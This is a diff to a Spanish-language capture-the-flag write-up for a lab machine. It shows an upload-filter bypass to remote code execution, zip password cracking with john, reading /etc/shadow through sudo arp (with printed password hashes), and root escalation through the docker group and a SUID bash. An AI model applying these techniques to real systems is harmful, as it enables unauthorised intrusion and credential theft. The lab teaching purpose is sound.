@@ -47,7 +47,7 @@ Lo primero es interceptar la petición de subida de web.php con ``Burpsuite`` y 
 
 Puede que los filtros se estén aplicando en uno o varios niveles, como la extensión, Content-Type, Magic Numbers...
 
-Por comenzar con algo sencillo, vamos a probar a modificar la extensión a ``.phar``:
+Por comenzar con algo sencillo, vamos a probar a modificar la extensión a ``.phar`` y enviamos:
 
 ![10](Images/10.png)
 
@@ -58,7 +58,7 @@ Viendo el output de feroxbuster, en realidad tenemos bastantes pocas opciones, p
 ``http://10.10.10.16/backup/empty/web.phar?cmd=id``
 ![11](Images/11.png)
 
-Estupendo, tenemos RCE como www-data. Pues es el momento de preparar la revshell.
+Estupendo, tenemos RCE como ``www-data``. Es el momento de preparar la revshell.
 
 Confirmamos que el sistema objetivo tiene ``busybox``:
 ![12](Images/12.png)
@@ -115,13 +115,11 @@ Una vez descargado, si intentamos descomprimirlo:
 Como tiene una contraseña que no conocemos, no podemos descomprimirlo. Por ello, se lo pasamos a ``zip2john`` para intentar averiguarla:
 
 ``zip2john backup_id.zip > hashzip``
-
 ![21](Images/21.png)
 
 Y ahora intentamos romperlo con ``JohnTheRipper``:
 
 ``john --wordlist=/usr/share/wordlists/rockyou.txt hashzip``
-
 ![22](Images/22.png)
 
 Bingo, tenemos la contraseña del comprimido: ``swordfish``.
@@ -148,7 +146,6 @@ Hemos pivotado correctamente al usuario ``calabrote``.
 Se prueban escaladas típicas de Linux:
 
 ``sudo -l``
-
 ![26](Images/26.png)
 
 Podemos hacer uso del binario ``/usr/sbin/arp`` como root sin proporcionar contraseña. Es el momento de sacar GTFOBINS de paseo: https://gtfobins.github.io/gtfobins/arp/#sudo
@@ -156,6 +153,7 @@ Podemos hacer uso del binario ``/usr/sbin/arp`` como root sin proporcionar contr
 ![27](Images/27.png)
 
 Vale, podemos leer cualquier archivo del sistema. Se comienza buscando la ``id_rsa`` de ``root`` y de ``foque``, pero ninguna de las dos existe, por lo que vamos a intentar romper los hashes de ``/etc/shadow``:
+
 ```
 LFILE=/etc/shadow
 sudo arp -v -f "$LFILE"
@@ -166,9 +164,10 @@ sudo arp -v -f "$LFILE"
 ![29](Images/29.png)
 
 Es el momento de sacar ``unshadow``:
-
-``root:$y$j9T$ycPw6ExAs7uKaf.s4WmVT0$Cls81gdv2a3L8lCKXnaH3EbORFsnjfx7RAndSbM1o31:19857:0:99999:7:::``
-``foque:$y$j9T$1ZNMO8SSAx/mlYKHZQxGN0$uSN1A6Wcd31cwu0gPBWEsf7LDMtATI8xDsYKdbi4WY2:19855:0:99999:7:::``
+```
+root:$y$j9T$ycPw6ExAs7uKaf.s4WmVT0$Cls81gdv2a3L8lCKXnaH3EbORFsnjfx7RAndSbM1o31:19857:0:99999:7:::
+foque:$y$j9T$1ZNMO8SSAx/mlYKHZQxGN0$uSN1A6Wcd31cwu0gPBWEsf7LDMtATI8xDsYKdbi4WY2:19855:0:99999:7:::
+```
 
 ![30](Images/30.png)
 
@@ -190,9 +189,10 @@ Existe, podemos ver cositas. Por ejemplo, al principio se ve cómo se ha ejecuta
 ![34](Images/34.png)
 
 Si seguimos bajando entre todo el output que nos devuelve, encontramos referencia a una conexión a mysql (aunque no está corriendo de forma interna):
+
 ![35](Images/35.png)
 
-Si buscamos la ubicación de ``script_net_backup.sh`` ( ``find / ´name script_net_backup.sh 2>/dev/null``), no lo encuentra. Pero podemos volver a hacer uso del binario ``arp`` como sudo e ir buscándolo en aquellos directorios en los que sabemos que como ``calabrote`` no tenemos acceso. Por ejemplo, el directorio personal del usuario ``foque``:
+Si buscamos la ubicación de ``script_net_backup.sh`` ( ``find / -name script_net_backup.sh 2>/dev/null``), no lo encuentra. Pero podemos volver a hacer uso del binario ``arp`` como sudo e ir buscándolo en aquellos directorios en los que sabemos que como ``calabrote`` no tenemos acceso. Por ejemplo, el directorio personal del usuario ``foque``:
 
 ``LFILE=/home/foque/script_net_backup.sh``
 ``sudo arp -v -f "$LFILE"``
@@ -225,19 +225,22 @@ Podemos recoger la flag de usuario en el directorio personal del usuario foque: 
 # PRIVESC
 
  Nuestro usuario forma parte del grupo ``docker``:
+ 
 ![41](Images/41.png)
 
-Si miramos las imágenes que hay de docker:
-``docker images``
+Si miramos las imágenes que hay de docker: ``docker images``
+
 ![42](Images/42.png)
 
 Empezamos creando un contenedor (``PWN``) basándonos en la imagen de ``alpine``, que se montará en ``/mnt/root``:
 
 ``docker run -dit -v /:/mnt/root --name PWN alpine``
+
 ![43](Images/43.png)
 
 Con docker podemos hacer una consola interactiva dentro del contenedor (que contiene desde la raíz del anfitrión):
 ``docker exec -it PWN sh``
+
 ![44](Images/44.png)
 
 Somos root en el contenedor, pero en ``/mnt/root`` hemos montado todo el sistema desde la raíz ``/``, por lo que podemos leer la flag de root en ``/mnt/root/root/root.txt``
@@ -247,10 +250,11 @@ Somos root en el contenedor, pero en ``/mnt/root`` hemos montado todo el sistema
 Pero podemos ir incluso más lejos: podemos cambiar los permisos del binario ``/bin/bash`` original. Una vez cambiemos los permisos del binario, nos salimos del contenedor (``exit``) y si listamos los permisos del binario original:
 
 ``chmod u+s /mnt/root/bin/bash``
+
 ![46](Images/46.png)
 
-Tan sencillo como ejecutar la bash con privilegios.
-``bash -p``
+Tan sencillo como ejecutar la bash con privilegios: ``bash -p``
+
 ![47](Images/47.png)
 
 Y ahora sí, desde el sistema principal y no desde el contenedor, recogemos la flag de root en ``/root/root.txt``:
